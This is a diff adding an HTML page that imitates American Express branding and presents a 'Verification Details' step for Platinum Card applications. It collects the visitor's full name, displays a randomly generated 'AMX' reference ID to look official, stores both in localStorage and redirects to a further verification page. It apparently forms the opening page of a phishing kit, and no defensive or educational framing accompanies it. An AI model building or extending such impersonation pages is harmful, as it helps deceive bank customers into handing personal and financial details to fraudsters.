@@ -1,0 +1,318 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>American Express Platinum Card Applications</title>
+
+<style>
+
+:root{
+    --amex-blue:#00175a;
+    --amex-action:#0070d5;
+    --bg-gray:#f7f8f9;
+    --border:#747474;
+}
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;
+    color:#333;
+    background-color:var(--bg-gray);
+}
+
+/* ================= NAVBAR ================= */
+
+nav{
+    background:#fff;
+    padding:12px 5%;
+    display:flex;
+    align-items:center;
+    border-bottom:1px solid #ddd;
+    gap:30px;
+}
+
+.amex-logo-box{
+    background-color:var(--amex-blue);
+    color:white;
+    padding:8px 12px;
+    font-weight:bold;
+    font-size:13px;
+    line-height:1.1;
+    text-transform:uppercase;
+    text-align:center;
+    min-width:80px;
+    border-radius:2px;
+}
+
+.nav-links{
+    display:flex;
+    gap:25px;
+    margin-right:auto;
+}
+
+.nav-links a{
+    text-decoration:none;
+    color:#333;
+    font-weight:500;
+    font-size:15px;
+}
+
+.login-btn{
+    background:#f0f0f0;
+    border:1px solid #ccc;
+    padding:8px 20px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+@media(max-width:768px){
+
+    .nav-links{
+        display:none;
+    }
+
+    nav{
+        justify-content:space-between;
+    }
+}
+
+/* ================= MAIN ================= */
+
+.container{
+    max-width:700px;
+    margin:40px auto;
+    padding:0 20px;
+}
+
+.form-container{
+    background:#fff;
+    padding:35px;
+    border-radius:6px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.05);
+}
+
+/* ================= FORM ================= */
+
+.form-group{
+    display:flex;
+    flex-direction:column;
+    margin-bottom:25px;
+}
+
+label{
+    font-weight:bold;
+    font-size:14px;
+    margin-bottom:8px;
+}
+
+input{
+    width:100%;
+    padding:14px;
+    border:1px solid var(--border);
+    border-radius:4px;
+    font-size:16px;
+    background:#fff;
+}
+
+/* REFERENCE BOX */
+
+.reference-box{
+    background:#f3f6fb;
+    border:1px solid #d8e2f0;
+    padding:18px;
+    border-radius:6px;
+    margin-bottom:25px;
+}
+
+.reference-title{
+    font-size:14px;
+    color:#666;
+    margin-bottom:8px;
+}
+
+.reference-id{
+    font-size:28px;
+    font-weight:bold;
+    color:var(--amex-blue);
+    letter-spacing:2px;
+}
+
+/* BUTTON */
+
+.btn-continue{
+    background-color:var(--amex-action);
+    color:white;
+    border:none;
+    width:100%;
+    padding:16px;
+    font-size:18px;
+    font-weight:bold;
+    cursor:pointer;
+    border-radius:4px;
+    transition:.3s;
+}
+
+.btn-continue:hover{
+    background:#005db5;
+}
+
+/* FOOTER */
+
+footer{
+    text-align:center;
+    color:#999;
+    font-size:12px;
+    margin:40px 0;
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- ================= HEADER ================= -->
+
+<nav>
+
+    <div class="amex-logo-box">
+        AMERICAN<br>EXPRESS
+    </div>
+
+    <div class="nav-links">
+        <a href="#">My Account</a>
+        <a href="#">Cards</a>
+        <a href="#">Travel</a>
+        <a href="#">Insurance</a>
+    </div>
+
+    <button class="login-btn">
+        Log In
+    </button>
+
+</nav>
+
+<!-- ================= MAIN ================= -->
+
+<div class="container">
+
+    <div class="form-container">
+
+        <h1 style="margin-top:0;margin-bottom:30px;">
+            Verification Details
+        </h1>
+
+        <form id="referenceForm">
+
+            <!-- NAME -->
+
+            <div class="form-group">
+
+                <label>
+                    Name
+                </label>
+
+                <input
+                type="text"
+                id="name"
+                placeholder="Enter your full name"
+                required>
+
+            </div>
+
+            <!-- REFERENCE ID -->
+
+            <div class="reference-box">
+
+                <div class="reference-title">
+                    Your reference id
+                </div>
+
+                <div class="reference-id" id="referenceId">
+                    REF000000
+                </div>
+
+            </div>
+
+            <!-- BUTTON -->
+
+            <button
+            type="submit"
+            class="btn-continue">
+
+                Continue
+
+            </button>
+
+        </form>
+
+    </div>
+
+</div>
+
+<!-- ================= FOOTER ================= -->
+
+<footer>
+    Copyright © 2026 American Express Banking Corp.
+</footer>
+
+<!-- ================= SCRIPT ================= -->
+
+<script>
+
+/* ================= RANDOM REFERENCE ================= */
+
+const reference =
+"AMX" +
+Math.floor(
+100000000 + Math.random() * 900000000
+);
+
+/* SHOW REFERENCE */
+
+document.getElementById("referenceId")
+.innerText = reference;
+
+/* SAVE REFERENCE */
+
+localStorage.setItem(
+    "referenceId",
+    reference
+);
+
+/* ================= FORM SUBMIT ================= */
+
+document.getElementById("referenceForm")
+.addEventListener("submit", function(e){
+
+    e.preventDefault();
+
+    /* GET NAME */
+
+    const fullName =
+    document.getElementById("name").value;
+
+    /* SAVE NAME */
+
+    localStorage.setItem(
+        "fullName",
+        fullName
+    );
+
+    /* REDIRECT */
+
+    window.location.href =
+    "verification.html";
+
+});
+
+</script>
+
+</body>
+</html>
